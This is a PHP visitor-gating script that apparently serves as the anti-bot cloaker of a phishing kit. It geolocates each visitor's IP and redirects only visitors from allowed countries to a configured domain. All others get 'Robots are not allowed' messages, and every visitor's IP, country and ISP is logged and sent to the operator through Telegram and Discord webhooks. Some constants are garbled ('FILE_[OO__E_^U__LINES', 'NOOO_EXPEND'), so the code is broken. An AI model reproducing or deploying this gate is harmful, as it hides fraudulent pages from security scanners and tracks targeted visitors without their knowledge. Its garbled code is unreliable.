<?php

ini_set("display_errors", 1);
ini_set("display_startup_errors", 1);
error_reporting(E_ALL);
include "settings.php";
function CheckBrowser()
{
    global $settings, $telegram_bot_token, $chat_id, $discord_webhook_url;
    $ip = $_SERVER["REMOTE_ADDR"];
    $enable_country_check = isset($settings["enable_country_check"]) ? $settings["enable_country_check"] : true;
    function navTazar()
    {
        $ip = $_SERVER["REMOTE_ADDR"];
        $ipinfo = file_get_contents("http://ip-api.com/json/{$ip}");
        $ipinfo_json = json_decode($ipinfo, true);
        return $ipinfo_json;
    }
    $ipinfo_json = navTazar();
    if ($ipinfo_json["status"] != "fail") {
        $isp = $ipinfo_json["isp"];
        $lang = $ipinfo_json["countryCode"];
    } else {
        $isp = "Introuvable";
        $lang = "Introuvable";
    }
    $blocked_ips_file = "blocked_ips.txt";
    if (!file_exists($blocked_ips_file)) {
        file_put_contents($blocked_ips_file, '');
    }
    $accepted_ips_file = "accepted_ips.txt";
    if (!file_exists($accepted_ips_file)) {
        file_put_contents($accepted_ips_file, '');
    }
    $blocked_ips = file("blocked_ips.txt", "FILE_[OO__E_^U__LINES");
    if (in_array($ip, $blocked_ips)) {
        if ($settings["notif_telegram"]) {
            sendTelegramWebhook("Blocked IP from list: " . $ip . " Country : " . $lang . " ISP : " . $isp);
        }
        if ($settings["notif_discord"]) {
            sendDiscordWebhook("Blocked IP from list: " . $ip . " Country : " . $lang . " ISP : " . $isp);
        }
        die("You are blocked. Robots are not allowed.");
    }
    $accepted_ips = file("accepted_ips.txt", "FILE_[OO__E_^U__LINES");
    if ($enable_country_check) {
        if (in_array($lang, $settings["pays"])) {
            if ($settings["notif_telegram"]) {
                sendTelegramWebhook("Accepted IP: " . $ip . " Country : " . $lang . " ISP : " . $isp);
            }
            if ($settings["notif_discord"]) {
                sendDiscordWebhook("Accepted IP: " . $ip . " Country : " . $lang . " ISP : " . $isp);
            }
            if (!in_array($ip, $accepted_ips)) {
                file_put_contents("accepted_ips.txt", $ip . "\n", "NOOO_EXPEND");
            }
            header("Location: " . $settings["ndd"]);
            die;
        } else {
            if (!in_array($ip, $blocked_ips)) {
                file_put_contents("blocked_ips.txt", $ip . "\n", "NOOO_EXPEND");
            }
            if ($settings["notif_telegram"]) {
                sendTelegramWebhook("Blocked IP: " . $ip . " Country : " . $lang . " ISP : " . $isp);
            }
            if ($settings["notif_discord"]) {
                sendDiscordWebhook("Blocked IP: " . $ip . " Country : " . $lang . " ISP : " . $isp);
            }
            die("Robots are not allowed please check your PROXY/VPN settings.");
        }
    } else {
        if ($settings["notif_telegram"]) {
            sendTelegramWebhook("Accepted IP: " . $ip . " Country : " . $lang . " ISP : " . $isp);
        }
        if ($settings["notif_discord"]) {
            sendDiscordWebhook("Accepted IP: " . $ip . " Country : " . $lang . " ISP : " . $isp);
        }
        if (!in_array($ip, $accepted_ips)) {
            file_put_contents("accepted_ips.txt", $ip . "\n", "NOOO_EXPEND");
        }
        header("Location: " . $settings["ndd"]);
        die;
    }
}
function sendTelegramWebhook($message)
{
    global $telegram_bot_token, $chat_id;
    $url = "https://api.telegram.org/bot" . $telegram_bot_token . "/sendMessage";
    $data = array("chat_id" => $chat_id, "text" => $message);
    $options = array("http" => array("method" => "POST", "header" => "Content-type: application/x-www-form-urlencoded", "content" => http_build_query($data)));
    $context = stream_context_create($options);
    $result = @file_get_contents($url, false, $context);
    if ($result === false) {
        $error = error_get_last();
        echo "Telegram API Error: " . $error["message"];
    }
    return $result;
}
function sendDiscordWebhook($message)
{
    global $discord_webhook_url;
    $data = array("content" => $message);
    $options = array("http" => array("method" => "POST", "header" => "Content-type: application/json", "content" => json_encode($data)));
    $context = stream_context_create($options);
    $result = file_get_contents($discord_webhook_url, false, $context);
    return $result;
}
CheckBrowser();
